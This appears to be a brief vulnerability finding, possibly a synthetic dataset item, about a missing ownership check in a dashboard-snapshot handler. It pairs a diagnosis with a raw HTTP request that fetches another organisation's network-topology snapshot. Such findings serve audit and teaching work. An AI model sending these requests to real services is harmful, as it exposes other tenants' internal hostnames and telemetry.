diagnosis: The handler returns dashboard configuration snapshots from S3 purely by path parameter dashboardId without checking if the authorizer principal's account owns the dashboard. An authenticated caller can download server telemetry layout snapshots and internal hostnames of other organizations.
exploit_request:
GET /dashboards/dash_internal_network_topology/snapshot HTTP/1.1
Host: ops.cloudwatch-proxy.com
Authorization: Bearer <user_token>
